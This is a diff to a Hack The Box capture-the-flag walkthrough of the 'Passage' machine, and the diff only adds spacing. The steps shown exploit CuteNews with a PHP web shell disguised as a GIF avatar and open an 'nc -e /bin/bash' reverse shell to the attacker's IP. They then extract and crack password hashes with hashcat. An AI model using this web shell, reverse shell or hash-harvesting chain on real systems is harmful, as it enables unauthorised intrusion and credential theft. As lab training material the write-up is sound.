@@ -13,19 +13,23 @@ This machine is currently active, and is my first attempt at HTB.  Its IP addres
   3.  Go to `http://passage:80` on your browser.  Notice it uses CuteNews;
   4.  Go to `http://passage:80/CuteNews/` and create an account;
   5.  Edit your account by uploading an avatar "photo", which is really just a file containing:
+    
     ```
     GIF8;
     <?php system($_REQUEST['cmd']) ?>
     ```
+    
   6.  Go to `http://passage:80/CuteNews/uploads/`, and click on your recently uploaded PHP file;
   7.  Run `nc -nlvp 1234` in a terminal window;
   8.  Get the IP address of your `tun0` interface: `ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'`;
   9.  Append the URL of your upload with `?cmd=nc -e /bin/bash <IP from step 8> 1234`;
   10. Go back to your terminal and run `python3 -c 'import pty; pty.spawn("/bin/bash")'` to gain access to a shell;
   11. Now that you have access, you need some passwords.  There are some hashed passwords, encoded using `base64`, in the `/var/www/html/CuteNews/cdata/users/` directory.  You will need to get each of their hashes where possible: you can do some *quick and dirty* bash parsing to get the usernames and hashes:
+    
     ```
     for i in /var/www/html/CuteNews/cdata/users/*.php; do DECODED="$(tail -n 1 "$i" | base64 -d 2>/dev/null)"; RET_VAL=$?; if [ $RET_VAL -eq 0 ]; then HASH="$(echo "$DECODED" | awk -F'64:' '{print $2}' | awk -F';' '{print $1}' | tr -d '"' | sed '/^$/d')"; if [[ ! -z "${HASH}" ]]; then NAME="$(echo "$DECODED" | awk -F'"email"' '{print $2}' | awk -F'@' '{print $1}' | awk -F'"' '{print $2}' | tr -d '"' | sed '/^$/d')"; echo -e "${NAME}\n${HASH}\n"; fi; fi; done
     ```
+    
     You could also parse the `/var/www/html/CuteNews/cdata/users/lines` file using `while read`, as I think that has the same content.
   12. You will now need to choose a hash and decode it.  For me, `paul`'s hash worked.  I checked `hash-identify` to see that it was likely `SHA-256`, and thus ran `hashcat -a 0 -m 1400 "$OUR_HASH" /usr/share/wordlists/rockyou.txt && hashcat --show -m 1400 "$OUR_HASH"`: we see the password is `atlanta1`.  (Thank you, Paul, for having a terrible password);
   13. Login as Paul; `su paul`&mdash;using the password we found above.  Capture an intermediate flag: `cat ~/user.txt`;
